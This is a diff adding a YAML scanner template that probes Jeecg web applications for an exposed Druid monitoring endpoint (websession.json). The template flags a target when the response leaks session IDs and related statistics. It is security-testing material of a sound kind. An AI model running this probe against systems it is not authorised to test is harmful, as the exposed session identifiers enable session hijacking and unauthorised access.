@@ -1,0 +1,12 @@
+name: poc-yaml-jeecg-info-leak
+rules:
+  - method: GET
+    path: /webpage/system/druid/websession.json
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"ResultCode") && response.body.bcontains(b"SESSIONID") && response.body.bcontains(b"ConcurrentMax") && response.body.bcontains(b"RequestTimeMillisTotal")
+detail:
+  author: liberty
+  links:
+    - https://blog.csdn.net/caiqiiqi/article/details/88672752
+    - https://xz.aliyun.com/t/4405
